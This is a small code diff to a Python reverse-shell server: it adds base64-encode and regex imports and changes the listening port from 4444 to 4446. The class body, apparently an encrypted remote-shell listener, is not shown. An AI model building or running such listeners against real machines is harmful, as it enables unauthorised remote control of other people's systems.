@@ -1,9 +1,9 @@
 import socket
 import threading
 from aes_crypt import AESCipher
-from base64 import b64decode
+from base64 import b64decode, b64encode
 import os
-
+import re
 
 class ReverseShellServer:
     def __init__(self, host, port):
@@ -294,5 +294,5 @@ class ReverseShellServer:
 
 
 if __name__ == "__main__":
-    server = ReverseShellServer("0.0.0.0", 4444)
+    server = ReverseShellServer("0.0.0.0", 4446)
     server.start()
